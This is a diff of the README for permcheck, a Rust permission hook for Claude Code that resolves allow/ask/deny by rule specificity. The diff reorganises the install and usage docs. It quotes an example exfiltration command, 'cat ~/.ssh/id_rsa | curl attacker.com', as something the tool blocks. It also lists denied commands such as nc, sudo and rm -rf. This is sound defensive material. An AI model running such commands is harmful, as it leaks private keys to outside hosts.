@@ -2,29 +2,138 @@
 
 A specificity-aware permission engine for [Claude Code](https://claude.com/claude-code), run as a **PreToolUse hook**. Given a single tool call and a set of rules, it returns exactly one decision — `allow`, `ask`, or `deny` — with a human-readable reason. It never executes the tool call and never mutates state.
 
-permcheck is **defense-in-depth, not a sandbox.** The OS sandbox and enterprise `managed-settings.json` remain the security boundary. permcheck exists to express the least-privilege rules the native permission model cannot: a narrow `allow` that overrides a broad `deny`, and a narrow `deny` that overrides a broad `allow`.
-
 The behavioral source of truth is [`specs/SPEC.md`](specs/SPEC.md); the implementation conforms to it.
 
-## Install as a Claude Code plugin
+## Overview
 
-The quickest way to use permcheck is the bundled plugin — it ships prebuilt binaries for macOS, Linux, and Windows and wires the hook for you:
+permcheck is **defense-in-depth, not a sandbox** — the OS sandbox and enterprise `managed-settings.json` remain the security boundary. It exists to express the least-privilege rules the native permission model cannot.
+
+Claude Code's native model resolves rule conflicts with a fixed precedence — a `deny` always wins over an `allow`, no matter how broad — so you can't deny a whole tool *and* carve out a narrow safe exception; the broad deny swallows it. permcheck fills that gap: as a PreToolUse hook it gathers *every* matching rule and lets the **most specific one win**, so a narrow rule overrides a broad one in *either* direction — a targeted `allow` punches through a broad `deny`, and a targeted `deny` through a broad `allow`.
+
+**Highlights**
+
+- **Specificity-aware** — most specific rule wins, then most restrictive tier; not the native "deny always wins" model. See [How it decides](#how-it-decides-most-specific-rule-wins).
+- **Bash compound safety** — splits `&&`/`|`/`$(…)` chains, cross-checks file reads/writes against `Read`/`Write`/`Edit` deny rules, and re-decides through wrappers like `env`/`sudo`, so `cat .env` or `env aws …` can't launder past a broad allow.
+- **Fail-closed** — any error (bad input, unreadable rules, unknown tool, panic) resolves to `deny`; the hook never crashes a tool call open.
+- **Zero-config install** — the [plugin](#installation) ships prebuilt binaries for macOS/Linux/Windows and wires the hook without touching your `settings.json`.
+- **Fast & dependency-light** — a short-lived Rust process per call; only `serde`/`serde_json`, no `regex` or `clap`, optimized for cold start.
+
+**At a glance**
+
+| | |
+|---|---|
+| **What** | PreToolUse permission engine for [Claude Code](https://claude.com/claude-code) |
+| **Decision** | one of `allow` · `ask` · `deny`, with a reason |
+| **Install** | `/plugin install permcheck@zethian` (see [Installation](#installation)) |
+| **Language** | Rust (edition 2024) |
+| **Role** | defense-in-depth overlay — *not* a sandbox or security boundary |
+| **License** | [GPL-3.0](LICENSE) |
+
+## Installation
+
+permcheck decides `allow` / `ask` / `deny` for each tool call against a rules file you provide. There are three ways to wire it into Claude Code — **method 1 (the plugin) is easiest** and needs no local build; methods 2 and 3 are for a binary you build yourself.
+
+**Two files, two jobs** — don't conflate them:
+
+| File | Owned by | Job |
+|---|---|---|
+| **`settings.json`** (Claude Code's) | Claude Code | *Wiring* — the `hooks.PreToolUse` entry that tells Claude Code to run permcheck before each tool call. Method 2 (`--install`) writes it; the plugin registers the hook without touching it. |
+| **rules file** (e.g. `rules/permcheck.json`, or your own) | you | *Policy* — the `allow`/`ask`/`deny` rules permcheck decides against, passed via `--rules`. Seed one with `--init-rules` (method 2 below). |
+
+The wiring file just points at the policy file (`permcheck --hook --rules <policy>`). The plugin (method 1) hides both; methods 2 and 3 expose them.
+
+### 1. As a Claude Code plugin (recommended)
+
+The bundled plugin ships prebuilt binaries for macOS, Linux, and Windows and wires the hook for you:
 
 ```sh
-/plugin marketplace add saleem-mirza/permcheck
+/plugin marketplace add saleem-mirza/marketplace
 /plugin install permcheck@zethian
 ```
 
-**Installing makes permcheck your `PreToolUse` permission engine automatically** — functionally identical to a `PreToolUse` hook in `settings.json`, but with nothing to hand-wire:
+The plugin is served from [`saleem-mirza/marketplace`](https://github.com/saleem-mirza/marketplace) — a dedicated, source-free distribution repo carrying only the catalog, hooks, rules, and prebuilt binaries — so installing never pulls the Rust source onto your machine.
+
+**Installing makes permcheck your `PreToolUse` permission engine automatically** — nothing to hand-wire:
 
 - The hook runs on **every** tool call the moment the plugin is enabled — deciding `allow` / `ask` / `deny` before the call executes.
 - **Your `settings.json` is not modified.** Claude Code only records the plugin under `enabledPlugins`; the hook lives in the plugin and appears in `/hooks` with source `Plugin`.
 - It **merges with** (doesn't replace) any existing PreToolUse hooks, and a `deny` wins across them — so permcheck is an authoritative least-privilege overlay on the native permission model.
 - To turn it off, disable or uninstall the plugin via `/plugin`; there's nothing to unpick from `settings.json`.
 
-See [`plugin/README.md`](plugin/README.md) for local development (`--plugin-dir`), per-project rule overrides, and platform notes. Prefer to wire it into `settings.json` by hand instead of using the plugin? The `--hook`/CLI usage is [below](#usage).
+The plugin decides against its bundled [`rules/permcheck.json`](rules/permcheck.json); see [`plugin/README.md`](plugin/README.md) for per-project rule overrides, local development (`--plugin-dir`), and platform notes.
 
----
+### 2. Self-wiring into `settings.json` (`--install` / `--uninstall`)
+
+If you [build](#build) the binary yourself instead of using the plugin, permcheck can wire its own `PreToolUse` hook into a Claude Code `settings.json`, **idempotently** (safe to re-run; never touches your other settings or hooks).
+
+**First, a rules file** — needed by this method and by [method 3](#3-by-hand-in-settingsjson). If you don't have one, generate a secure starter: the canonical deny list (blocks `sudo`, `rm -rf`, secret reads, force-push, …), `defaultMode: ask`, and empty `allow`/`ask` you grow yourself:
+
+```sh
+permcheck --init-rules ~/.claude/permcheck.json   # refuses to overwrite an existing file
+permcheck --init-rules                             # no path → writes ./permcheck.json
+```
+
+Then wire it in:
+
+```
+permcheck --install --rules <path> [--user|--project|--local]
+permcheck --uninstall [--user|--project|--local]
+```
+
+- **Scope** (default `--user`): `--user` → `~/.claude/settings.json`, `--project` → `./.claude/settings.json`, `--local` → `./.claude/settings.local.json`.
+- `--install` requires `--rules`; the path is absolutized, validated (it must load), and baked into the injected `permcheck --hook --rules "<abs>"` command. Re-running rewrites the existing entry in place rather than duplicating it.
+- `--uninstall` removes only permcheck's entry and prunes emptied hook containers. Works across Linux, macOS, and Windows.
+- **You don't create the file.** `--install` creates `settings.json` and its `.claude/` directory if absent, and preserves every existing key and hook otherwise. If the file exists but isn't valid JSON, it **errors instead of writing** — it can't corrupt a settings file.
+- **What the created file looks like.** When no `settings.json` exists, `--install` writes a minimal but complete Claude Code settings file — just the `hooks.PreToolUse` entry. Claude Code has no required keys (a settings file is any JSON object; every field is optional), so nothing else is needed and permcheck adds nothing else:
+  ```json
+  {
+    "hooks": {
+      "PreToolUse": [
+        {
+          "matcher": "*",
+          "hooks": [
+            {
+              "type": "command",
+              "command": "permcheck --hook --rules \"<abs path to your rules file>\""
+            }
+          ]
+        }
+      ]
+    }
+  }
+  ```
+
+```sh
+permcheck --install --rules rules/permcheck.json          # → ~/.claude/settings.json
+permcheck --install --project --rules .permcheck/rules.json # → ./.claude/settings.json
+permcheck --uninstall                                       # remove from ~/.claude/settings.json
+```
+
+**Verify it wired up:** run `/hooks` in Claude Code — the permcheck `PreToolUse` entry appears there. Or re-run the same `--install`; a no-op prints `permcheck hook already up to date`.
+
+### 3. By hand in `settings.json`
+
+Or add the hook yourself under `hooks.PreToolUse`, pointing `--rules` at your rules file (generate a secure starter with `permcheck --init-rules <path>` — see method 2):
+
+```json
+{
+  "hooks": {
+    "PreToolUse": [
+      {
+        "matcher": "*",
+        "hooks": [
+          {
+            "type": "command",
+            "command": "/abs/path/to/permcheck --hook --rules /abs/path/to/rules/permcheck.json"
+          }
+        ]
+      }
+    ]
+  }
+}
+```
+
+This invokes the hook interface documented under [Usage](#usage). Use **absolute paths** for both the binary and `--rules`. After editing, confirm the file is valid JSON (`jq . ~/.claude/settings.json`) and that Claude Code loaded it with `/hooks` — a malformed file is silently ignored. If unsure of the exact shape, run `--install` once (method 2) and copy the block it generates.
 
 ## How it decides: most specific rule wins
 
@@ -44,11 +153,9 @@ The consequence — and the whole reason permcheck exists — is that a narrow r
 | `kubectl get pods` | **allow** | `Bash(kubectl get:*)` beats `Bash(kubectl:*)` deny |
 | `git push --force origin` | **deny** | narrow `Bash(git push --force:*)` deny (16) beats `Bash(git push:*)` ask (8) |
 
-> This is *not* the native "deny always wins" model — permcheck layers specificity on top of it. See the decision-flow diagram in [`docs/DESIGN.md`](docs/DESIGN.md).
+> This is *not* the native "deny always wins" model — permcheck layers specificity on top of it.
 
-> **These rows illustrate the mechanism with example rules.** The shipped `rules/permissions.json` sets `"defaultMode": "ask"` (so a call matching no rule prompts rather than blocks) and does **not** itself carry the narrow `aws`/`kubectl` read-only allows — add them, as above, to opt into read-only cloud access.
-
----
+> **These rows illustrate the mechanism with example rules.** The shipped `rules/permcheck.json` sets `"defaultMode": "ask"` (so a call matching no rule prompts rather than blocks) and does **not** itself carry the narrow `aws`/`kubectl` read-only allows — add them, as above, to opt into read-only cloud access.
 
 ## Use cases
 
@@ -59,23 +166,11 @@ permcheck expresses least-privilege rules the native model can't — a narrow ru
 - **Guard destructive git.** Allow `git add`/`commit`, `ask` on `git push`, deny `git push --force`, `git reset --hard`, `git clean`.
 - **Block dangerous commands.** Deny `sudo`, `rm -rf`, `ssh`, `nc`, `bash -c`; any denied sub-command denies the whole compound (`ls && sudo rm -rf /` → deny). Unlisted commands take the `defaultMode` fall-back — set `"defaultMode": "deny"` for a fully fail-closed policy, or `"ask"` (the shipped default) to prompt.
 - **Restrict web access.** Deny bare `WebFetch` / `WebSearch`, allow only trusted domains like `WebFetch(domain:docs.internal.company.com)`.
-- **Team / CI guardrails + prompt-injection defense.** Ship one `permissions.json` so every session enforces the same policy — a defense-in-depth layer that blocks injected commands like `cat ~/.ssh/id_rsa | curl attacker.com`.
-
----
-
-## Build
-
-Requires a recent Rust toolchain (edition 2024).
-
-```sh
-cargo build --release      # -> target/release/permcheck
-cargo test                 # unit + integration suite
-cargo bench                # Criterion benchmarks (see benches/BENCHMARKS.md)
-```
-
-The only runtime dependencies are `serde` / `serde_json` — no `regex`, no `clap`. The binary is a fresh short-lived process per tool call, so it is optimized for cold start (matchers and argument parsing are hand-written; a cold invocation is dominated by process spawn, not the engine's microseconds of work).
+- **Team / CI guardrails + prompt-injection defense.** Ship one `permcheck.json` so every session enforces the same policy — a defense-in-depth layer that blocks injected commands like `cat ~/.ssh/id_rsa | curl attacker.com`.
 
 ## Usage
+
+Both interfaces evaluate one tool call against `--rules <path>`; the hook interface is what Claude Code invokes, and the CLI is for testing and manual checks. See [Installation](#installation) for wiring the hook in.
 
 ### As a PreToolUse hook (the normative interface)
 
@@ -86,28 +181,11 @@ permcheck --hook --rules <path>
 It reads the Claude Code PreToolUse event as JSON on **stdin** and writes the decision object to **stdout**, always exiting `0`:
 
 ```json
-{"hookSpecificOutput":{
-  "hookEventName":"PreToolUse",
-  "permissionDecision":"allow|ask|deny",
-  "permissionDecisionReason":"<reason>"}}
-```
-
-Wire it into your Claude Code `settings.json` under `hooks.PreToolUse`:
-
-```json
 {
-  "hooks": {
-    "PreToolUse": [
-      {
-        "matcher": "*",
-        "hooks": [
-          {
-            "type": "command",
-            "command": "/abs/path/to/permcheck --hook --rules /abs/path/to/rules/permissions.json"
-          }
-        ]
-      }
-    ]
+  "hookSpecificOutput": {
+    "hookEventName": "PreToolUse",
+    "permissionDecision": "allow|ask|deny",
+    "permissionDecisionReason": "<reason>"
   }
 }
 ```
@@ -129,45 +207,36 @@ permcheck <Tool> [payload] --rules <path> [--json]
 | `2` | deny |
 | `3` | config/usage error (bad arguments, unreadable or invalid rules file) |
 
-`--json` prints the same decision object as hook mode instead of using the exit code. `--rules` accepts either `--rules <path>` or `--rules=<path>`.
+`--json` prints the same decision object as hook mode instead of using the exit code. `--rules` accepts either `--rules <path>` or `--rules=<path>`. Run `permcheck --version` to print the version, `permcheck --help` for full usage.
 
 ```sh
-permcheck Bash "cat notes.txt"          --rules rules/permissions.json   # exit 0 (allow)
-permcheck Bash "gcloud compute ..."     --rules rules/permissions.json   # exit 1 (ask, unlisted)
-permcheck Bash "kubectl delete pod x"   --rules rules/permissions.json   # exit 2 (deny)
-permcheck Read "/home/user/.ssh/id_rsa" --rules rules/permissions.json   # exit 2 (deny)
-```
-
-### Wiring it in by hand (`--install` / `--uninstall`)
-
-Prefer not to use the [plugin](#install-as-a-claude-code-plugin) or hand-edit JSON? permcheck can wire its own `PreToolUse` hook into a Claude Code `settings.json`, **idempotently** (safe to re-run; never touches your other settings or hooks):
-
-```
-permcheck --install --rules <path> [--user|--project|--local]
-permcheck --uninstall [--user|--project|--local]
-```
-
-- **Scope** (default `--user`): `--user` → `~/.claude/settings.json`, `--project` → `./.claude/settings.json`, `--local` → `./.claude/settings.local.json`.
-- `--install` requires `--rules`; the path is absolutized, validated (it must load), and baked into the injected `permcheck --hook --rules "<abs>"` command. Re-running rewrites the existing entry in place rather than duplicating it.
-- `--uninstall` removes only permcheck's entry and prunes emptied hook containers. Works across Linux, macOS, and Windows.
-
-```sh
-permcheck --install --rules rules/permissions.json          # → ~/.claude/settings.json
-permcheck --install --project --rules .permcheck/rules.json # → ./.claude/settings.json
-permcheck --uninstall                                       # remove from ~/.claude/settings.json
+permcheck Bash "cat notes.txt"          --rules rules/permcheck.json   # exit 0 (allow)
+permcheck Bash "gcloud compute ..."     --rules rules/permcheck.json   # exit 1 (ask, unlisted)
+permcheck Bash "kubectl delete pod x"   --rules rules/permcheck.json   # exit 2 (deny)
+permcheck Read "/home/user/.ssh/id_rsa" --rules rules/permcheck.json   # exit 2 (deny)
 ```
 
 ## Rules
 
-Rules are passed explicitly via `--rules <path>`; there is no hardcoded default. The canonical reference set ships at [`rules/permissions.json`](rules/permissions.json).
+Rules are passed explicitly via `--rules <path>`; there is no decision-time default — the hook and CLI always require `--rules`. The canonical reference set ships at [`rules/permcheck.json`](rules/permcheck.json); it is also embedded in the binary purely as the seed for `permcheck --init-rules` (which emits its deny list into a fresh starter file), never as a silent fallback.
 
 Both of these shapes parse identically. `defaultMode` sets the fall-back for calls that match no rule (`"ask"` → ask, otherwise deny); any other keys are ignored — so the file can double as a Claude Code settings file:
 
 ```json
-{ "permissions": { "allow": [...], "ask": [...], "deny": [...] } }
+{
+  "permissions": {
+    "allow": [...],
+    "ask": [...],
+    "deny": [...]
+  }
+}
 ```
 ```json
-{ "allow": [...], "ask": [...], "deny": [...] }
+{
+  "allow": [...],
+  "ask": [...],
+  "deny": [...]
+}
 ```
 
 Each entry is a rule string in one of two forms:
@@ -197,27 +266,19 @@ A single `Bash` command can chain several commands, so it gets extra scrutiny (s
 
 The Bash analyzer is a best-effort scanner, not a full shell parser. When it cannot understand a construct, it errs toward `deny`. Documented non-goals (`eval`, aliases, `xargs`-assembled commands, adversarial glob patterns, …) are listed in SPEC §9.
 
-## Project layout
+## Build
 
-```
-rules/permissions.json   canonical reference rule set
-specs/SPEC.md            behavioral source of truth
-docs/DESIGN.md           technical design + decision-flow diagram
-docs/PROPOSAL.md         problem statement
-benches/                 Criterion benchmark + results
-src/                     library (engine) + binary (thin I/O shell)
-tests/                   integration tests (binary + public API), incl. evasion suites
+Requires a recent Rust toolchain (edition 2024).
+
+```sh
+cargo build --release      # -> target/release/permcheck
+cargo test                 # unit + integration suite
+cargo bench                # Criterion benchmarks (see benches/BENCHMARKS.md)
 ```
 
-| Module | Responsibility |
-|---|---|
-| `src/lib.rs` | crate root; `evaluate()`, `load_rules*` |
-| `src/types.rs` | `Tier`, `Decision`, `Family`, payload extraction |
-| `src/rules.rs` | grammar, loading, compiled `RuleSet` |
-| `src/matcher.rs` | per-family matchers + specificity scoring |
-| `src/engine.rs` | winner selection + candidate forms |
-| `src/bash.rs` | tokenizer, splitter, file-access cross-check |
-| `src/main.rs` | argument parsing, hook/CLI dispatch |
+The only runtime dependencies are `serde` / `serde_json` — no `regex`, no `clap`. The binary is a fresh short-lived process per tool call, so it is optimized for cold start (matchers and argument parsing are hand-written; a cold invocation is dominated by process spawn, not the engine's microseconds of work).
+
+Packaging the plugin and cutting a release are documented in [`CONTRIBUTING.md`](CONTRIBUTING.md), and the code map is under [Code map](CONTRIBUTING.md#code-map).
 
 ## License
 
